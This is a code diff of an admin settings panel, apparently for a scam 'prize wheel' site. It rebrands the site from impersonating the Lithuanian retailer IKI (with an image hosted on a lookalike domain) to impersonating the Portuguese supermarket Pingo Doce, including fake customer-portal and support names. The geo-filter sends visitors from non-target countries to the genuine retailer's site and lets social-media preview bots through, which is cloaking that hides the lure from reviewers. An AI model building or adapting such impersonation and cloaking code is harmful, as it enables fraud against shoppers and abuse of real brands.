@@ -10,8 +10,8 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   const [saving, setSaving] = useState(false);
   const [uploading, setUploading] = useState<string | null>(null);
   const [allowedCountries, setAllowedCountries] = useState<string[]>([]);
-  const [geoRedirectUrl, setGeoRedirectUrl] = useState("https://www.iki.lt");
-  const [campaignName, setCampaignName] = useState("IKI");
+  const [geoRedirectUrl, setGeoRedirectUrl] = useState("https://www.pingodoce.pt");
+  const [campaignName, setCampaignName] = useState("Pingo Doce");
   const [themePrimary, setThemePrimary] = useState("#0fae4e");
   const [openContinent, setOpenContinent] = useState<string | null>(null);
   const supabase = createBrowserSupabaseClient();
@@ -53,12 +53,12 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   }
 
   const DEFAULTS = {
-    logo_url: "/form-assets/iki-mini-logo.png",
+    logo_url: "/PD-mini-logo.png",
     bg_url: "/form-assets/bg-desktop.png",
     bg_url_mobile: "/form-assets/bg-mobile.png",
-    og_image_url: "https://maxima.onnemang.store/og-image.jpg",
-    portal_name: "IKI klientų portalas",
-    support_center_name: "IKI klientų aptarnavimas",
+    og_image_url: "https://pingodoce.pt/og-image.jpg",
+    portal_name: "Portal do Cliente Pingo Doce",
+    support_center_name: "Apoio ao Cliente Pingo Doce",
   };
 
   const fetchSettings = async () => {
@@ -79,8 +79,8 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         wheel_settings: { ...ws, bg_url_mobile: ws.bg_url_mobile || DEFAULTS.bg_url_mobile },
       });
       setAllowedCountries(Array.isArray(ws.allowed_countries) ? ws.allowed_countries : []);
-      setGeoRedirectUrl(typeof ws.geo_redirect_url === "string" && ws.geo_redirect_url.trim() !== "" ? ws.geo_redirect_url : "https://www.iki.lt");
-      setCampaignName(typeof ws.campaign_name === "string" && ws.campaign_name.trim() !== "" ? ws.campaign_name.trim() : "IKI");
+      setGeoRedirectUrl(typeof ws.geo_redirect_url === "string" && ws.geo_redirect_url.trim() !== "" ? ws.geo_redirect_url : "https://www.pingodoce.pt");
+      setCampaignName(typeof ws.campaign_name === "string" && ws.campaign_name.trim() !== "" ? ws.campaign_name.trim() : "Pingo Doce");
       setThemePrimary(typeof ws.theme_primary === "string" && /^#[0-9a-fA-F]{6}$/.test(ws.theme_primary.trim()) ? ws.theme_primary.trim() : "#0fae4e");
     }
     setLoading(false);
@@ -119,8 +119,8 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         wheel_settings: {
           ...(settings.wheel_settings || {}),
           allowed_countries: allowedCountries,
-          geo_redirect_url: geoRedirectUrl.trim() || "https://www.iki.lt",
-          campaign_name: campaignName.trim() || "IKI",
+          geo_redirect_url: geoRedirectUrl.trim() || "https://www.pingodoce.pt",
+          campaign_name: campaignName.trim() || "Pingo Doce",
           theme_primary: /^#[0-9a-fA-F]{6}$/.test(themePrimary.trim()) ? themePrimary.trim() : "#0fae4e",
         }
       })
@@ -358,11 +358,11 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                   type="text"
                   value={geoRedirectUrl}
                   onChange={(e) => setGeoRedirectUrl(e.target.value)}
-                  placeholder="https://www.iki.lt"
+                  placeholder="https://www.pingodoce.pt"
                   className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
                 />
                 <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
-                  Seçili olmayan ülkelerden gelen ziyaretçiler bu adrese gönderilir. Boş bırakılırsa https://www.iki.lt kullanılır. Sosyal medya önizleme botları bu filtreden etkilenmez.
+                  Seçili olmayan ülkelerden gelen ziyaretçiler bu adrese gönderilir. Boş bırakılırsa https://www.pingodoce.pt kullanılır. Sosyal medya önizleme botları bu filtreden etkilenmez.
                 </p>
               </div>
             </div>
@@ -381,15 +381,15 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                   type="text"
                   value={campaignName}
                   onChange={(e) => setCampaignName(e.target.value)}
-                  placeholder="IKI"
+                  placeholder="Pingo Doce"
                   className={`flex-1 px-4 py-3 rounded-xl text-sm font-bold outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
                 />
                 <span className={`text-xs font-bold px-3 py-1.5 rounded-full whitespace-nowrap ${darkMode ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : 'bg-orange-100 text-[#EB5E28]'}`}>
-                  {campaignName.trim() || "IKI"}
+                  {campaignName.trim() || "Pingo Doce"}
                 </span>
               </div>
               <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
-                Buraya yazılan isim kaydedildiğinde sitenin <b>tüm metinlerindeki "IKI" ibaresi</b> bu isimle değiştirilir (başlıklar, portal adı, OG paylaşım metinleri, destek merkezi vb.). Boş bırakılırsa "IKI" kalır.
+                Buraya yazılan isim kaydedildiğinde sitenin <b>tüm metinlerindeki "Pingo Doce" ibaresi</b> bu isimle değiştirilir (başlıklar, portal adı, OG paylaşım metinleri, destek merkezi vb.). Boş bırakılırsa "Pingo Doce" kalır.
               </p>
             </div>
 
